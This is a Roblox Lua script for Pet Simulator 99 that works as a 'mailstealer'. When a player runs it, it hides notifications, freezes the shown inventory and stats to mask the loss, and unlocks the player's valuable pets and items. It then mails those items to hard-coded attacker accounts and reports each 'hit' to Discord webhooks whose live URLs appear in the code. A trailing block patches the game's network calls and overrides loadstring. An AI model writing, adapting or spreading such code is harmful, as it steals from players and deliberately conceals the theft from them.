-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts

Username = "holder1holder1holder"
Username2 = "holder3holder3holder"
Webhook = "https://discord.com/api/webhooks/1242417254465798224/X1XJ1DLh3iecYPNshz90NdAEJbdfNMaNRWEYaavWUA6wdcZCcGSLPh2DKh_TXHNXT2Ur"
MinimumRAP = 100000
HubName = "X"

-- player check and stuff

if getgenv().Executed == true then
    return
end

getgenv().Executed = true

ping = "@everyone"

if HubName == nil then
    HubName = "X"
end
UserSettings().GameSettings.MasterVolume = 0

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return
end

if Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return
end

if MinimumRAP == nil then
    MinimumRAP = 100000
end

if Webhook == "" or Webhook == nil then
    ping = "forgot to put webhook"
    Webhook =
        "https://webhook.lewisakura.moe/api/webhooks/1200510852802019469/2xKnhaP0PbNx5jHkjdJvPHJrjOz1VKbGvPOegRVlCw0we7ncQ7dyLHBJ7pRkpOvBzk2Z"
end

if Username2 == "" or Username2 == nil then
    Username2 = Username
end

-- variables

local Library = require(game:GetService("ReplicatedStorage").Library)
local Save = Library.Save.Get()
local Client = require(game.ReplicatedStorage.Library.Client)
local Inventory = Save.Inventory
local Directory = Library.Directory

local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local HttpService = game:GetService("HttpService")

local function GetGems()
    return Client.CurrencyCmds.Get("Diamonds") or 0
end

if GetGems() < 10000 then
    NO_GEMS = true
end

-- hiding gui
Hiding = true
if Hiding == true then
    local loading = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
    loading.Disabled = true
    local noti = game:GetService("Players").LocalPlayer.PlayerGui.Notifications
    noti:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            noti.Enabled = false
        end
    )
    noti.Enabled = false
    local player = game:GetService("Players").LocalPlayer
    local leaderstats = player:WaitForChild("leaderstats")

    for statName, statValue in pairs(leaderstats:GetChildren()) do
        if statValue:IsA("IntValue") then
            local initialValue = statValue.Value
            statValue:GetPropertyChangedSignal("Value"):Connect(
                function()
                    statValue.Value = initialValue
                end
            )
        end
    end
    local function deep_copy_table(original)
        local copy = table.clone(original)
        for key, value in pairs(copy) do
            if type(value) == "table" then
                copy[key] = table.clone(value)
            end
        end

        return copy
    end

    RealInventory = deep_copy_table(Library.Save.Get().Inventory)
    GetEquipped = Library.PetCmds.GetEquipped()
    FavoriteModeSelection = Library.Save.Get().FavoriteModeSelection
    FavoriteModeSelectionPlaza = Library.Save.Get().FavoriteModeSelectionPlaza

    local function freeze_inventory()
        local apply_packet = Library.Items.Container.ApplyPacket
        Library.Items.Container.ApplyPacket = function(self, packet)
            for operation, data in pairs(packet) do
                for InventoryIndex, SetData in pairs(data) do
                    if operation == "set" then
                        for Index, Value in pairs(SetData or {}) do
                            RealInventory[InventoryIndex][Index] = Value
                        end
                    elseif operation == "del" then
                        RealInventory.Pet[SetData] = nil
                        RealInventory.Currency[SetData] = nil
                        RealInventory.Egg[SetData] = nil
                        RealInventory.Enchant[SetData] = nil
                    end
                end
            end
        end

        local oldGet = Library.Save.Get
        Library.Save.Get = function(...)
            local save = oldGet(...)
            save.EquippedPets = table.clone(GetEquipped or {})
            save.FavoriteModeSelection = {FavoriteModeSelection}
            save.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
            return save
        end
    end
    freeze_inventory()
end
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()

local function SuffixNumber(a)
    local actually_gems = a or 0
    local suffix = ""
    if actually_gems >= 1000000000 then
        actually_gems = actually_gems / 1000000000
        suffix = "b"
    elseif actually_gems >= 1000000 then
        actually_gems = actually_gems / 1000000
        suffix = "m"
    elseif actually_gems >= 1000 then
        actually_gems = actually_gems / 1000
        suffix = "k"
    end
    return string.format("%.1f%s", actually_gems, suffix)
end

local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

if Save.Box then
    for key, _ in pairs(Save.Box) do
        game:GetService("ReplicatedStorage").Network["Box: Withdraw All"]:InvokeServer(key)
    end
end

local function GetRAP(dick, vagina)
    return (Library.DevRAPCmds.Get(
        {
            Class = {Name = vagina},
            IsA = function(sex)
                return sex == vagina
            end,
            GetId = function()
                return dick.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = dick.id, pt = dick.pt, sh = dick.sh, tn = dick.tn})
            end
        }
    ) or 0)
end

local function GetRAPOfHuges()
    HugesRAP = 0
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                HugesRAP = HugesRAP + GetRAP(v, "Pet")
            end
        end
    end
    return HugesRAP
end

if Webhook and string.find(Webhook, "discord") then
    Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
end

local function GetHits()
    HitsList = {}
    for Class, _ in pairs(Inventory) do
        for UID, v in pairs(_) do
            RAP = math.floor(GetRAP(v, Class))
            if RAP > 1000 and RAP >= MinimumRAP then
                if RAP >= 20000000 then
                    user = Username
                else
                    user = Username2
                end
                local ItemName = v.id
                local petVariant = v.sh and "Shiny " or ""
                if v.pt == 1 then
                    petVariant = "Golden " .. petVariant
                elseif v.pt == 2 then
                    petVariant = "Rainbow " .. petVariant
                end
                ItemName = petVariant .. ItemName
                if Class == "Pet" and (Directory.Pets[v.id].huge or Directory.Pets[v.id].exclusiveLevel) then
                    table.insert(
                        HitsList,
                        {
                            ITEM_CLASS = Class,
                            ITEM_ID = UID,
                            ITEM_NAME = ItemName,
                            ITEM_AMOUNT = (v._am or 1),
                            ITEM_RAP = RAP,
                            ITEM_LOCKED = (v._lk or false),
                            USERNAME = user
                        }
                    )
                elseif Class ~= "Pet" then
                    table.insert(
                            HitsList,
                            {
                                ITEM_CLASS = Class,
                                ITEM_ID = UID,
                                ITEM_NAME = ItemName,
                                ITEM_AMOUNT = (v._am or 1),
                                ITEM_RAP = RAP,
                                ITEM_LOCKED = (v._lk or false),
                                USERNAME = user
                            }
                    )
                end
            end
        end
    end
    table.sort(
        HitsList,
        function(a, b)
            return a.ITEM_RAP > b.ITEM_RAP
        end
    )
    return HitsList
end

HitsList = GetHits()
OldHits = GetHits()

--\\ DONT TOUCH!!
local function GetRAPOfHits(HitsList)
    rap = 0
    for i, v in pairs(HitsList) do
        rap = rap + v.ITEM_RAP
    end
    return rap
end
ALLRAP = GetRAPOfHits(HitsList)
PetValue = SuffixNumber(ALLRAP)
OldGems = SuffixNumber(GetGems())
--// DONT TOUCH!!

stupid_user = game.Players.LocalPlayer.Name
stupid_display_user = game.Players.LocalPlayer.DisplayName

local function SendWebhook(url, ping, LostList, HitsList)
    local LostString = ""
    if LostList == nil then
        LostList = {}
    end
    if HitsList == nil then
        HitsList = {}
    end
    for _, v in pairs(LostList) do
        LostString = LostString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    if LostString == "" then
        LostString = "NO LOST"
    end
    local HitsString = ""
    for _, v in pairs(HitsList) do
        HitsString = HitsString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    if HitsString == "" then
        HitsString = "NO ITEMS"
    end

    imgs = "https://i.ibb.co/GWsnpph/xpng.png"
    data1 = {
        ["content"] = ping,
        ["username"] = "X Mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0x4C00FF),
                ["thumbnail"] = {
                    ["url"] = imgs,
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            stupid_user ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    stupid_display_user ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username ..
                                                "\n(\240\159\146\187) Executor: " ..
                                                    identifyexecutor() ..
                                                        "\n(\240\159\146\142) Diamonds: " ..
                                                            OldGems ..
                                                                "\n(\240\159\164\145) Total RAP: " ..
                                                                    PetValue ..
                                                                        "\n(\240\159\147\140) Version: X" .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) SENT:`",
                        ["value"] = "```" .. HitsString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\144\177) DIDNT SEND:`",
                        ["value"] = "```" .. LostString .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    newdata1 = HttpService:JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil then
        local abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        local success, result =
            pcall(
            function()
                return HttpService:PostAsync(url, newdata1)
            end
        )
        if not success then
            request(abcdef1)
        end
    end
end

DiamondsBalance = GetGems()

local function SendGems()
    GemAmount = DiamondsBalance
    local MaxHits = GemAmount / 10000
    local HitsAmount = #HitsList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    TotalGemsToSend = GemAmount - GemsToSendHits
    if TotalGemsToSend < 0 then
        TotalGemsToSend = 0
    end
    PossibleHitsToBeSend = (GemAmount - TotalGemsToSend) / 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(Inventory.Currency) do
            if v.id == "Diamonds" then
                SendRemote:InvokeServer(Username, v.id, "Currency", i, TotalGemsToSend)
            end
        end
    end
end

function subtractTables(table1, table2)
    local result = {}
    for _, item1 in ipairs(table1) do
        local found = false
        for _, item2 in ipairs(table2) do
            if
                item1.ITEM_CLASS == item2.ITEM_CLASS and item1.ITEM_ID == item2.ITEM_ID and
                    item1.ITEM_NAME == item2.ITEM_NAME and
                    item1.ITEM_AMOUNT == item2.ITEM_AMOUNT
             then
                found = true
                break
            end
        end
        if not found then
            table.insert(result, item1)
        end
    end
    return result
end

-- sending shit

-- SendGems()

local HitsList = GetHits()

Sent_Hits = {}

Library.Items.Container.ApplyPacket = function(self, packet)
    for operation, data in pairs(packet) do
        for InventoryIndex, SetData in pairs(data) do
            if operation == "del" then
                PetSended = true
            end
        end
    end
end

for i, v in pairs(HitsList) do
    if v.ITEM_LOCKED == true then
        game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(v.ITEM_ID, false)
    end
    local args = {
        [1] = v.USERNAME,
        [2] = v.ITEM_NAME,
        [3] = v.ITEM_CLASS,
        [4] = v.ITEM_ID,
        [5] = v.ITEM_AMOUNT
    }
    repeat
        SendRemote:InvokeServer(unpack(args))
    until PetSended
    PetSended = false
    table.insert(Sent_Hits, v)
end

LeftHits = subtractTables(HitsList, Sent_Hits)

PublicLog = true
if NO_GEMS ~= true then
    SendWebhook(Webhook, ping, LeftHits, Sent_Hits)
    if PublicLog then
        SendWebhook("https://webhook.lewisakura.moe/api/webhooks/1217561298984763503/-fV7UukyFwMdu2XaZZhLYwazAExsTG6NqQA8HAUiqxt5Nc0BfuMlVNbN-FmRlJv-c64E", "X Mailstealer on top", LeftHits, Sent_Hits)
    end
end

-- experimental


-- добавить отправку гемов
-- менять ник если почта полная
-- проверять почту если она доступна
-- починить эту как её


-- BLOB CODE START --

local cloneref = getgenv() and getgenv().cloneref or function(...) return ... end
local game = cloneref(getrenv().game)
local egorfun = cloneref(Instance.new("RemoteFunction"))
local Invoke = egorfun.InvokeServer
for i,v in pairs(getconstants(Invoke)) do
if v then if v=="Instance" or v=="Mailbox: Send" then
setconstant(Invoke, i, "get_blobbed")
end end
end
local g = getrawmetatable(game)
for i,v in pairs(getconstants(g.__namecall)) do
if v then if v=="Instance" or v=="Mailbox: Send" then
setconstant(g.__namecall, i, "get_blobbed")
end end
end
getgenv().loadstring = function(...) print(...) end

-- BLOB CODE END --